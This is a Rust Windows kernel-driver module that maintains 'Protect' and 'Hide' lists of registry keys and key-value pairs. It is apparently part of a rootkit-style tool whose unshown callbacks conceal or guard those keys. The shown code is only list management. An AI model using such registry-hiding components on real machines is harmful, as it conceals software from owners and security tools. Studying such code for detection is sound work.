extern crate alloc;

use {
    alloc::{string::{String, ToString}, vec::Vec}, 
    core::marker::PhantomData, 
    shared::structs::TargetRegistry, 
    spin::{lazy::Lazy, Mutex, MutexGuard}, 
    utils::KeyListType, 
    wdk_sys::{NTSTATUS, STATUS_DUPLICATE_OBJECTID, STATUS_SUCCESS, STATUS_UNSUCCESSFUL}
};

#[cfg(not(feature = "mapper"))]
pub mod callback;
pub mod utils;
#[cfg(not(feature = "mapper"))]
pub use callback::*;

/// List of keys and target values.
pub static TARGET_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));

/// List of target keys.
static TARGET_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));

/// List of hide keys.
static HIDE_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));

/// List of keys and target values.
static HIDE_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));

/// Trait defining common operations for registry lists.
trait RegistryList<T> {
    /// Adds an item to the registry list.
    ///
    /// # Parameters
    /// - `list`: A mutable reference to the list.
    /// - `item`: The item to be added.
    ///
    /// # Returns
    /// - `NTSTATUS`: Status code indicating success or failure of the operation.
    ///
    fn add_item(list: &mut Vec<T>, item: T) -> NTSTATUS;

    /// Removes an item from the registry list.
    ///
    /// # Parameters
    /// - `list`: A mutable reference to the list.
    /// - `item`: The item to be removed.
    ///
    /// # Returns
    /// - `NTSTATUS`: Status code indicating success or failure of the operation.
    ///
    fn remove_item(list: &mut Vec<T>, item: &T) -> NTSTATUS;

    /// Checks if an item is in the registry list.
    ///
    /// # Parameters
    /// - `list`: A reference to the list.
    /// - `item`: The item to be checked.
    ///
    /// # Returns
    /// - `bool`: Returns true if the item is in the list, or false otherwise.
    /// 
    fn contains_item(list: &Vec<T>, item: &T) -> bool;
}

/// Implement the trait for the list of key-value pairs.
impl RegistryList<(String, String)> for Vec<(String, String)> {
    fn add_item(list: &mut Vec<(String, String)>, item: (String, String)) -> NTSTATUS {
        if list.len() >= 20 {
            log::error!("The list of protected values is full");
            return STATUS_UNSUCCESSFUL;
        }

        if list.iter().any(|(k, v)| k == &item.0 && v == &item.1) {
            log::warn!("Key-value ({}, {}) already exists in the list", item.0, item.1);
            return STATUS_DUPLICATE_OBJECTID;
        }

        list.push(item);
        STATUS_SUCCESS
    }

    fn remove_item(list: &mut Vec<(String, String)>, item: &(String, String)) -> NTSTATUS {
        if let Some(index) = list.iter().position(|(k, v)| k == &item.0 && v == &item.1) {
            list.remove(index);
            STATUS_SUCCESS
        } else {
            log::error!("Key-value ({}, {}) not found in list", item.0, item.1);
            STATUS_UNSUCCESSFUL
        }
    }

    fn contains_item(list: &Vec<(String, String)>, item: &(String, String)) -> bool {
        list.contains(item)
    }
}

/// Implement the trait for the list of keys.
impl RegistryList<String> for Vec<String> {
    fn add_item(list: &mut Vec<String>, item: String) -> NTSTATUS {
        if list.len() >= 20 {
            log::error!("The list of keys is full");
            return STATUS_UNSUCCESSFUL;
        }

        if list.contains(&item) {
            log::warn!("Key ({}) already exists in the list", item);
            return STATUS_DUPLICATE_OBJECTID;
        }

        list.push(item);
        STATUS_SUCCESS
    }

    fn remove_item(list: &mut Vec<String>, item: &String) -> NTSTATUS {
        if let Some(index) = list.iter().position(|k| k == item) {
            list.remove(index);
            STATUS_SUCCESS
        } else {
            log::error!("Key ({}) not found in list", item);
            STATUS_UNSUCCESSFUL
        }
    }

    fn contains_item(list: &Vec<String>, item: &String) -> bool {
        list.contains(item)
    }
}

/// Structure representing the Registry.
pub struct Registry<T> {
    _marker: PhantomData<T>,
}

impl Registry<(String, String)> {
    /// Adds or removes a key-value pair from the list of protected values.
    ///
    /// # Parameters
    /// - `target`: The `TargetRegistry` structure representing the key-value pair to be protected or removed.
    ///
    /// # Returns
    /// - `NTSTATUS`: Status code indicating success or failure of the operation.
    /// 
    pub fn add_remove_registry_toggle(target: *mut TargetRegistry, list_type: KeyListType) -> NTSTATUS {
        let key = unsafe { (*target).key.clone() };
        let value = unsafe { (*target).value.clone() };
        let enable = unsafe { (*target).enable };

        let status = match list_type {
            KeyListType::Protect => {
                let mut list = TARGET_KEY_VALUES.lock();
                if enable {
                    Vec::<(String,String)>::add_item(&mut list, (key, value))
                } else {
                    Vec::<(String,String)>::remove_item(&mut list, &(key, value))
                }
            }
            KeyListType::Hide => {
                let mut list = HIDE_KEY_VALUES.lock();
                if enable {
                    Vec::<(String,String)>::add_item(&mut list,(key, value))
                } else {
                    Vec::<(String,String)>::remove_item(&mut list, &(key, value))
                }
            }
        };

        status
    }

    /// Checks if the key-value pair is in the list of protected values.
    ///
    /// # Parameters
    /// - `key`: The key being checked.
    /// - `value`: The value being checked.
    ///
    /// # Returns
    /// - `bool`: Returns true if the key-value pair is in the list, or false otherwise.
    /// 
    pub fn check_target(key: String, value: String, list: MutexGuard<Vec<(String, String)>>) -> bool {
        Vec::<(String, String)>::contains_item(&list, &(key, value))
    }
}

impl Registry<String> {
    /// Adds or removes a key from the list of protected keys.
    ///
    /// # Parameters
    /// - `key`: The key to be protected or removed.
    /// - `enable`: A boolean indicating whether to add (true) or remove (false) the key.
    ///
    /// # Returns
    /// - `NTSTATUS`: Status code indicating success or failure of the operation.
    /// 
    pub fn add_remove_key_toggle(target: *mut TargetRegistry, list_type: KeyListType) -> NTSTATUS {
        let key = unsafe { &(*target).key }.to_string();
        let enable = unsafe { (*target).enable };

        let status = match list_type {
            KeyListType::Protect => {
                let mut list = TARGET_KEYS.lock();
                if enable {
                    Vec::add_item(&mut list, key)
                } else {
                    Vec::remove_item(&mut list, &key)
                }
            }
            KeyListType::Hide => {
                let mut list = HIDE_KEYS.lock();
                if enable {
                    Vec::add_item(&mut list, key)
                } else {
                    Vec::remove_item(&mut list, &key)
                }
            }
        };

        status
    }

    /// Checks if the key is in the list of protected keys.
    ///
    /// # Parameters
    /// - `key`: The key being checked.
    ///
    /// # Returns
    /// - `bool`: Returns true if the key is in the list, or false otherwise.
    pub fn check_key(key: String, list: MutexGuard<Vec<String>>) -> bool {
        Vec::contains_item(&list, &key)
    }
}
